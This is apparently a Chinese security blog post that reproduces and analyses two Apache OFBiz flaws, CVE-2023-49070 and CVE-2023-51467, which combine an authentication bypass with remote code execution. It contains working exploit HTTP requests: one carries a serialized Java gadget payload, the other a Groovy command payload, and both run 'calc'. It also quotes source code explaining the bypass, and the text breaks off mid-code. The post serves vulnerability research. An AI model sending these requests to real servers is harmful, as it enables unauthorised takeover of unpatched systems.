<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>CVE-2023-49070/CVE-2023-51467 Apache OfBiz 鉴权绕过RCE - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="CVE-2023-49070/CVE-2023-51467 Apache OfBiz 鉴权绕过RCE - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2024/03/10/CVE-2023-49070_CVE-2023-51467%20Apache%20OfBiz%20%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87RCE/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2024-03-10T03:14:28.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>10,</span>
            <span>2024</span>
        </div>
        

        <h2 class="title">CVE-2023-49070/CVE-2023-51467 Apache OfBiz 鉴权绕过RCE</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="CVE-2023-49070"><a href="#CVE-2023-49070" class="headerlink" title="CVE-2023-49070"></a>CVE-2023-49070</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache ofbiz applications &lt; 18.12.10 due to xml-rpc java deserialzation bug.</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>准备一下18.12.9版本的OfBiz，然后把环境搭建起来。POC和之前的2020大差不差，看一下报文</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/webtools/control/xmlrpc/;/?USERNAME=&amp;PASSWORD=s&amp;requirePasswordChange=Y</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8443</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=5ACF0B44F3B88D25DA3ADD9C4AFB59FB.jvm1; Phpstorm-b3ad9363=84c4b31e-d5ed-4379-9a80-9b7507cedf1e; Pycharm-69800360=084fccb6-8efb-4ce0-ab83-e9ee9ec90c09; confluence.browse.space.cookie=space-blogposts; sidebar_collapsed=false; Goland-7a35ec7=48e3d45f-8c3b-456a-b871-9a45c9c01e45; cookie_token=ca76b89a250a514dd21370f8310865e199423e79b5b53392404ae1bb2ab24a8c; Phpstorm-b3ad9726=1202f496-542d-4162-91ec-bad957f445b9; lang=zh-cn; device=desktop; theme=default; OFBiz.Visitor=10000</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;122&quot;, &quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Microsoft Edge&quot;;v=&quot;122&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1697</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>ProjectDiscovery<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">params</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">param</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">struct</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">member</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>test<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span>&gt;</span>rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAAVnK/rq+AAAAMQAZAQABYQcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlBwADDAAFAAYKAAgACQEAEWphdmEvbGFuZy9SdW50aW1lBwALAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADQAOCgAMAA8BAARjYWxjCAARAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEwAUCgAMABUBAApTb3VyY2VGaWxlAQAGYS5qYXZhACEAAgAEAAAAAAABAAEABQAGAAEABwAAABoAAgABAAAADiq3AAq4ABASErYAFlexAAAAAAABABcAAAACABhwdAAIYm9vZ2lwb3BwdwEAeHEAfgANeA==<span class="tag">&lt;/<span class="name">serializable</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">member</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">struct</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>很快就知道这其实应该是个权限绕过，他的后半部分rpc是没修复的<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710039371298-527941d8-4bae-4723-b142-388bbfb0945d.png#averageHue=%235d8173&clientId=u093e4bd1-db97-4&from=paste&height=676&id=u6fc33de3&originHeight=845&originWidth=1164&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=98295&status=done&style=none&taskId=ub37e4fd6-68ee-447b-a942-6ce9fff1ba6&title=&width=931.2" alt="image.png"><br>因此我们需要分析一下鉴权的逻辑了。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>作了2层防护，首先多了一个CacheFilter进行过滤。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710039506414-7e09bb68-6d0c-4ba0-b852-008a0abdfb71.png#averageHue=%232e323a&clientId=u093e4bd1-db97-4&from=paste&height=718&id=ub0090933&originHeight=898&originWidth=1613&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=232109&status=done&style=none&taskId=u4513e14f-6e74-4748-ab98-e4e77fdc464&title=&width=1290.4" alt="image.png"><br>对之前payload中的<code>/control/xmlrpc</code>进行了过滤。并且对body中的serializable进行了检测，从这里其实看得出来修复人员是乱jb修复的。但凡你把2个检测分开写而不是写在一个if里，都不至于绕了。我们绕过也很简单，用分号去绕<br>然后修复人员对xmlrpc做了一个鉴权处理，把上次的false改为了true，因此要进入鉴权流程<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710039660829-4126b6f2-24ed-4729-9be0-68721d1e08be.png#averageHue=%232c3037&clientId=u093e4bd1-db97-4&from=paste&height=730&id=uef91b8ff&originHeight=913&originWidth=1618&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=253357&status=done&style=none&taskId=u157edd75-f266-4294-bc7c-eb2983dbeda&title=&width=1294.4" alt="image.png"><br><code>requestMap.securityAuth</code>为true。因此会反射调用checklogin方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">checkLogin</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="type">GenericValue</span> <span class="variable">userLogin</span> <span class="operator">=</span> checkLogout(request, response);</span><br><span class="line">        <span class="comment">// have to reget this because the old session object will be invalid</span></span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (userLogin == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// check parameters</span></span><br><span class="line">            username = request.getParameter(<span class="string">&quot;USERNAME&quot;</span>);</span><br><span class="line">            password = request.getParameter(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line">            token = request.getParameter(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line">            <span class="comment">// check session attributes</span></span><br><span class="line">            <span class="keyword">if</span> (username == <span class="literal">null</span>) username = (String) session.getAttribute(<span class="string">&quot;USERNAME&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (password == <span class="literal">null</span>) password = (String) session.getAttribute(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (token == <span class="literal">null</span>) token = (String) session.getAttribute(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// in this condition log them in if not already; if not logged in or can&#x27;t log in, save parameters and return error</span></span><br><span class="line">            <span class="keyword">if</span> (username == <span class="literal">null</span></span><br><span class="line">                    || (password == <span class="literal">null</span> &amp;&amp; token == <span class="literal">null</span>)</span><br><span class="line">                    || <span class="string">&quot;error&quot;</span>.equals(login(request, response))) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// make sure this attribute is not in the request; this avoids infinite recursion when a login by less stringent criteria (like not checkout the hasLoggedOut field) passes; this is not a normal circumstance but can happen with custom code or in funny error situations when the userLogin service gets the userLogin object but runs into another problem and fails to return an error</span></span><br><span class="line">                request.removeAttribute(<span class="string">&quot;_LOGIN_PASSED_&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// keep the previous request name in the session</span></span><br><span class="line">                session.setAttribute(<span class="string">&quot;_PREVIOUS_REQUEST_&quot;</span>, request.getPathInfo());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// <span class="doctag">NOTE:</span> not using the old _PREVIOUS_PARAMS_ attribute at all because it was a security hole as it was used to put data in the URL (never encrypted) that was originally in a form field that may have been encrypted</span></span><br><span class="line">                <span class="comment">// keep 2 maps: one for URL parameters and one for form parameters</span></span><br><span class="line">                Map&lt;String, Object&gt; urlParams = UtilHttp.getUrlOnlyParameterMap(request);</span><br><span class="line">                <span class="keyword">if</span> (UtilValidate.isNotEmpty(urlParams)) &#123;</span><br><span class="line">                    session.setAttribute(<span class="string">&quot;_PREVIOUS_PARAM_MAP_URL_&quot;</span>, urlParams);</span><br><span class="line">                &#125;</span><br><span class="line">                Map&lt;String, Object&gt; formParams = UtilHttp.getParameterMap(request, urlParams.keySet(), <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (UtilValidate.isNotEmpty(formParams)) &#123;</span><br><span class="line">                    session.setAttribute(<span class="string">&quot;_PREVIOUS_PARAM_MAP_FORM_&quot;</span>, formParams);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//if (Debug.infoOn()) Debug.logInfo(&quot;checkLogin: PathInfo=&quot; + request.getPathInfo(), module);</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Allow loggingOut when impersonated</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLoggingOut</span> <span class="operator">=</span> <span class="string">&quot;logout&quot;</span>.equals(RequestHandler.getRequestUri(request.getPathInfo()));</span><br><span class="line">        <span class="comment">//Check if the user has an impersonation in process</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">authoriseLoginDuringImpersonate</span> <span class="operator">=</span> EntityUtilProperties.propertyValueEquals(<span class="string">&quot;security&quot;</span>, <span class="string">&quot;security.login.authorised.during.impersonate&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!isLoggingOut &amp;&amp; !authoriseLoginDuringImpersonate &amp;&amp; checkImpersonationInProcess(request, response) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//remove error message that will be displayed in impersonated status screen</span></span><br><span class="line">            request.removeAttribute(<span class="string">&quot;_ERROR_MESSAGE_LIST_&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;impersonated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>我们看到这一点<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710039710222-c52e8119-8058-4418-a740-ab010e643417.png#averageHue=%23383d4b&clientId=u093e4bd1-db97-4&from=paste&height=207&id=ud371586c&originHeight=259&originWidth=1234&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60475&status=done&style=none&taskId=u8cfe6c0b-82c0-435f-99e1-31069dcee84&title=&width=987.2" alt="image.png"><br>这一段其实很奇怪，error判断成为了绕过的关键点，我们只需要让login的返回值不为error，并且passwd赋值，username不赋值，我们就绕过了鉴权。我们跟进login方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710039754309-df3adc8c-e291-4d52-af7e-7d4c8b6343b1.png#averageHue=%232f343e&clientId=u093e4bd1-db97-4&from=paste&height=462&id=u5a326e59&originHeight=578&originWidth=1318&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=149606&status=done&style=none&taskId=u9a3d18ac-6d8f-462d-967b-335b762f026&title=&width=1054.4" alt="image.png"><br>只需要加上个<code>requirePasswordChange=Y</code>就绕过了登录鉴权了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710039783498-b494fd27-4958-4d8b-862c-31fa6f75b154.png#averageHue=%232f333a&clientId=u093e4bd1-db97-4&from=paste&height=694&id=ub1d4ee1a&originHeight=867&originWidth=1855&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=356369&status=done&style=none&taskId=u09c41b28-73ab-4566-9f5b-5b33ecd28b8&title=&width=1484" alt="image.png"><br>最终回归到熟悉的Xml解析最后反序列化。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710039820348-6425ffc8-94c8-4566-a05e-fe5a00810be1.png#averageHue=%232b2f35&clientId=u093e4bd1-db97-4&from=paste&height=594&id=uffe75b27&originHeight=743&originWidth=1378&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=136092&status=done&style=none&taskId=uda4220b2-9560-43ba-b294-b65d6fb868a&title=&width=1102.4" alt="image.png"></p>
<h1 id="CVE-2023-51467"><a href="#CVE-2023-51467" class="headerlink" title="CVE-2023-51467"></a>CVE-2023-51467</h1><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache ofbiz applications &lt; &#x3D;18.12.10 due to xml-rpc java deserialzation bug.<br>多了个版本，在18.12.10中，官方移除了xmrpc组件，但是鉴权问题仍然存在，咱就是说不能一起修了。</p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /webtools/control/ProgramExport/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8443</span></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en-US;q=0.9,en;q=0.8</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 57</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">groovyProgram=throw+new+Exception(&#x27;calc&#x27;.execute().text);</span></span><br></pre></td></tr></table></figure>
<p>这一个是用groovy表达式rce，配合鉴权绕过，那么就可以访问任意接口，因此rce的可能性还是那么大。</p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>鉴权部分就一样了。groovy执行部分如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!parameters.groovyProgram) &#123;</span><br><span class="line">    groovyProgram = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">// Use the List variable recordValues to fill it with GenericValue maps.</span></span><br><span class="line"><span class="string">// full groovy syntaxt is available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">import org.apache.ofbiz.entity.util.EntityFindOptions</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// find the first three record in the product entity (if any)</span></span><br><span class="line"><span class="string">EntityFindOptions findOptions = new EntityFindOptions()</span></span><br><span class="line"><span class="string">findOptions.setMaxRows(3)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">List products = delegator.findList(&quot;Product&quot;, null, null, null, findOptions, false)</span></span><br><span class="line"><span class="string">if (products != null) &#123;</span></span><br><span class="line"><span class="string">    recordValues.addAll(products)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    parameters.groovyProgram = groovyProgram</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    groovyProgram = parameters.groovyProgram</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add imports for script.</span></span><br><span class="line"><span class="type">def</span> <span class="variable">importCustomizer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImportCustomizer</span>()</span><br><span class="line">importCustomizer.addImport(<span class="string">&quot;org.apache.ofbiz.entity.GenericValue&quot;</span>)</span><br><span class="line">importCustomizer.addImport(<span class="string">&quot;org.apache.ofbiz.entity.model.ModelEntity&quot;</span>)</span><br><span class="line"><span class="type">def</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CompilerConfiguration</span>()</span><br><span class="line">configuration.addCompilationCustomizers(importCustomizer)</span><br><span class="line"></span><br><span class="line"><span class="type">Binding</span> <span class="variable">binding</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Binding</span>()</span><br><span class="line">binding.setVariable(<span class="string">&quot;delegator&quot;</span>, delegator)</span><br><span class="line">binding.setVariable(<span class="string">&quot;recordValues&quot;</span>, recordValues)</span><br><span class="line"></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader()</span><br><span class="line"><span class="type">def</span> <span class="variable">shell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>(loader, binding, configuration)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (UtilValidate.isNotEmpty(groovyProgram)) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span 